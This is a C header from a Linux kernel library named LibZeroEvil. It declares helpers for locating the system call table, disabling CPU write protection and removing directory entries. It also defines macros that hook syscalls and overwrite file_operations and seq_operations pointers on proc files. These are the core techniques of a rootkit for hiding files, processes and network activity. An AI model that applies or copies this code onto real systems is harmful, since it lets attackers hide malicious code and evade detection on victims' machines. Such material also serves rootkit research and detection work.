// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef _GU_ZHENGXIONG_ZEROEVIL_H
# define _GU_ZHENGXIONG_ZEROEVIL_H


# ifndef CPP
# include <linux/module.h>
// filp_open, filp_close.
# include <linux/fs.h>
// PDE_DATA.
# include <linux/proc_fs.h>
// struct seq_file, struct seq_operations.
# include <linux/seq_file.h>
// printk.
# include <linux/printk.h>
# endif // CPP

# include "structs.h"


// Functions related to the system call table or dispatcher.

unsigned long **
get_sct(void);

unsigned long **
get_sct_via_sys_close(void);

void *
get_lstar_sct_addr(void);

unsigned long **
get_lstar_sct(void);

int
set_lstar_sct(u32 address);

void *
phys_to_virt_kern(phys_addr_t address);

// Functions related to write protection.

void
disable_wp(void);

void
enable_wp(void);

// Helper functions that print some information.

void
print_process_list(void);

void
print_module_list(void);

// Functions that process linux_dirent.

// TODO: Consider the name ``print_dents``?
void
print_dirent(struct linux_dirent *dirp, long total);

// TODO: Consider the name ``remove_dirent`` or ``remove_dent``?
long
remove_dirent_entry(char *name,
                    struct linux_dirent *dirp, long total);

// Miscellaneous helper functions.

// TODO: Consider the name ``strjoin`` or ``join_str``?
char *
join_strings(const char *const *strings, const char *delim,
             char *buff, size_t count);

// TODO: Consider the name ``print_hex``?
void
print_memory(void *addr, size_t count, const char *prompt);

// TODO: Consider the name ``print_asc``?
void
print_ascii(void *addr, size_t count, const char *prompt);


// Logging helpers.

// INFO: ``fn`` is short for ``__func__``.
# define fn_printk(level, fmt, ...)                     \
    printk(level "%s: " fmt, __func__, ##__VA_ARGS__)

// INFO: ``fm`` is short for ``__func__`` and ``module``.
# define fm_printk(level, fmt, ...)                     \
    printk(level "%s.%s: " fmt,                        \
           THIS_MODULE->name, __func__, ##__VA_ARGS__)

// INFO: I only use ``pr_alert`` at present.
// TODO: When wanting more, e.g. ``pr_info``, I will add them.
# define fn_alert(fmt, ...) \
    fn_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

# define fm_alert(fmt, ...) \
    fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)


// Hooking helpers for sys_call_table .

// INFO: These two macros depend on the your function naming.

# define HOOK_SCT(sct, name)                    \
    do {                                        \
        real_##name = (void *)sct[__NR_##name]; \
        sct[__NR_##name] = (void *)fake_##name; \
    } while (0)

# define UNHOOK_SCT(sct, name)                  \
    sct[__NR_##name] = (void *)real_##name


// Hooking helpers for file_op and the like.

// TODO: Abstract filp_open.

# define set_file_op(op, path, new, old)                            \
    do {                                                            \
        struct file *filp;                                          \
        struct file_operations *f_op;                               \
                                                                    \
        fm_alert("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            fm_alert("Succeeded in opening: %s\n", path);           \
            f_op = (struct file_operations *)filp->f_op;            \
            old = f_op->op;                                         \
                                                                    \
            fm_alert("Changing file_op->" #op " from %p to %p.\n",  \
                     old, new);                                     \
            disable_wp();                             \
            f_op->op = new;                                         \
            enable_wp();                              \
        }                                                           \
    } while (0)

# define set_afinfo_seq_op(op, path, afinfo_struct, new, old)   \
    do {                                                        \
        struct file *filp;                                      \
        afinfo_struct *afinfo;                                  \
                                                                \
        filp = filp_open(path, O_RDONLY, 0);                    \
        if (IS_ERR(filp)) {                                     \
            fm_alert("Failed to open %s with error %ld.\n",     \
                     path, PTR_ERR(filp));                      \
            old = NULL;                                         \
        } else {                                                \
                                                                \
            afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
            old = afinfo->seq_ops.op;                           \
            fm_alert("Setting seq_op->" #op " from %p to %p.",  \
                     old, new);                                 \
            afinfo->seq_ops.op = new;                           \
                                                                \
            filp_close(filp, 0);                                \
        }                                                       \
    } while (0)

# define set_file_seq_op(opname, path, new, old)                    \
    do {                                                            \
        struct file *filp;                                          \
        struct seq_file *seq;                                       \
        struct seq_operations *seq_op;                              \
                                                                    \
        fm_alert("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            fm_alert("Succeeded in opening: %s\n", path);           \
            seq = (struct seq_file *)filp->private_data;            \
            seq_op = (struct seq_operations *)seq->op;              \
            old = seq_op->opname;                                   \
                                                                    \
            fm_alert("Changing seq_op->"#opname" from %p to %p.\n", \
                     old, new);                                     \
            disable_wp();                             \
            seq_op->opname = new;                                   \
            enable_wp();                              \
        }                                                           \
    } while (0)


# endif // zeroevil.h
